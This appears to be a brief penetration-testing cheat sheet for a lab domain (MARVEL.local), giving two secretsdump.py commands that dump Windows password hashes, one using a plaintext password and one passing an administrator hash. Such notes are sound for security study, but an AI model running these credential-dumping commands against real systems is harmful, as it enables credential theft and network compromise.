# Dumping hashes

## Dumping with secretsdump and password

```bash
secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.70.138
```

## Dumping with secretsdump and hashes
```bash
secretsdump.py administrator:@192.168.70.138 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
```